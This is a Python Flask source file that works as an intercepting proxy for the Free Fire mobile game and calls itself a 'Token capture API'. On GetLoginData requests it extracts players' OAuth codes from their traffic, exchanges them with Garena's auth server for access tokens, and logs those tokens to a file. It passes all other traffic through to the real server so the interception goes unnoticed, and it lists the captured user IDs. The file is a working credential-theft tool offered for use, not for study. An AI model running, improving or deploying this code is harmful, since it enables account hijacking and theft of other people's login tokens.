from flask import Flask, request, jsonify, Response
import requests
import os
import re
from datetime import datetime

# ─── TRY TO IMPORT black-apis ──────────────────────────────────
HAS_PROTO = False
protos = None

try:
    from black_apis.freefire import protos
    HAS_PROTO = True
    print("✅ Imported black_apis.freefire.protos")
except ImportError as e1:
    print(f"⚠️ Import error (black_apis.freefire.protos): {e1}")
    try:
        import black_apis
        print(f"✅ black_apis version: {black_apis.__version__ if hasattr(black_apis, '__version__') else 'unknown'}")
        # Try to find the protos module
        if hasattr(black_apis, 'freefire'):
            if hasattr(black_apis.freefire, 'protos'):
                protos = black_apis.freefire.protos
                HAS_PROTO = True
                print("✅ Found black_apis.freefire.protos via attribute")
            else:
                print("⚠️ black_apis.freefire has no 'protos'")
        else:
            print("⚠️ black_apis has no 'freefire'")
    except ImportError as e2:
        print(f"⚠️ Cannot import black_apis at all: {e2}")

app = Flask(__name__)

# ─── CONFIGURATION ──────────────────────────────────────────────
REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')
TOKEN_URL = "https://auth.garena.com/oauth/token"
CLIENT_ID = "100067"
REDIRECT_URI = "https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/"

active_users = []
# ─────────────────────────────────────────────────────────────────

def extract_oauth_code_protobuf(raw_data):
    """Try to extract OAuth code using protobuf if available."""
    if not HAS_PROTO or protos is None:
        return None
    # List of possible message types – we'll try each.
    # These are based on common Free Fire protobuf messages.
    msg_types = [
        protos.LoginRequest,
        # protos.GetLoginDataRequest,   # if available
        # protos.OauthLoginRequest,     # if available
    ]
    for msg_cls in msg_types:
        try:
            msg = msg_cls()
            msg.ParseFromString(raw_data)
            # Search all fields for 'code'
            for field in msg.DESCRIPTOR.fields:
                if 'code' in field.name.lower():
                    val = getattr(msg, field.name, None)
                    if val:
                        return str(val)
            # Check common attributes
            if hasattr(msg, 'code'):
                return str(msg.code)
            if hasattr(msg, 'oauth_code'):
                return str(msg.oauth_code)
        except Exception as e:
            print(f"Protobuf parse error with {msg_cls.__name__}: {e}")
    return None

def extract_oauth_code_regex(raw_data):
    """Fallback: regex search for OAuth code patterns."""
    patterns = [
        rb'4\/[a-zA-Z0-9_\-\.]{30,60}',
        rb'EA[a-zA-Z0-9_\-]{30,60}',
        rb'[a-zA-Z0-9_\-]{30,50}'
    ]
    for pat in patterns:
        matches = re.findall(pat, raw_data)
        for m in matches:
            code = m.decode('utf-8', errors='ignore')
            if len(code) >= 30 and not code.isdigit():
                return code
    return None

def exchange_code_for_tokens(code):
    payload = {
        "grant_type": "authorization_code",
        "code": code,
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI
    }
    try:
        resp = requests.post(TOKEN_URL, data=payload, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            hex_token = data.get('access_token')
            return hex_token
        else:
            print(f"Exchange failed: {resp.status_code} - {resp.text[:200]}")
            return None
    except Exception as e:
        print(f"Exchange error: {e}")
        return None

@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST'])
def handle_request(user_id, subpath):
    print(f"\n🔹 {request.method} /user/{user_id}/{subpath}")

    if user_id not in active_users:
        active_users.append(user_id)
        print(f"👤 New user: {user_id}")

    if subpath == "GetLoginData":
        raw_data = request.get_data()
        print(f"📦 Received {len(raw_data)} bytes")

        # Print first 200 bytes as hex for debugging
        hex_preview = raw_data[:200].hex()
        print(f"📋 Hex preview (200): {hex_preview}")

        oauth_code = None
        if HAS_PROTO and protos is not None:
            oauth_code = extract_oauth_code_protobuf(raw_data)
            print(f"🔎 Protobuf extraction result: {oauth_code[:20] if oauth_code else 'None'}")
        else:
            print("⚠️ Protobuf not available – using regex fallback.")

        if not oauth_code:
            oauth_code = extract_oauth_code_regex(raw_data)
            print(f"🔎 Regex extraction result: {oauth_code[:20] if oauth_code else 'None'}")

        if oauth_code:
            print(f"🔑 OAuth code: {oauth_code[:20]}...")
            hex_token = exchange_code_for_tokens(oauth_code)
            if hex_token:
                print(f"🎯 HEX ACCESS TOKEN: {hex_token}")
                with open("tokens.txt", "a") as f:
                    f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")
            else:
                print("❌ No hex token returned.")
        else:
            print("⚠️ No OAuth code found in request.")
            # Print full hex for deeper analysis
            full_hex = raw_data.hex()
            print(f"📋 Full hex (first 500): {full_hex[:500]}")

        return jsonify({"status": "success", "message": "OK"}), 200

    # Forward other requests to Garena
    try:
        real_url = f"{REAL_SERVER}/{subpath}" if subpath else REAL_SERVER
        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
        headers.pop('Content-Length', None)
        headers['Host'] = 'client.ind.freefiremobile.com'

        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
        excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        resp_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]
        return Response(resp.content, status=resp.status_code, headers=resp_headers)
    except Exception as e:
        print(f"❌ Forward error: {e}")
        return jsonify({"status": "success", "message": "OK"}), 200

@app.route('/')
def admin():
    return jsonify({
        "active_users": active_users,
        "message": "Token capture API running"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)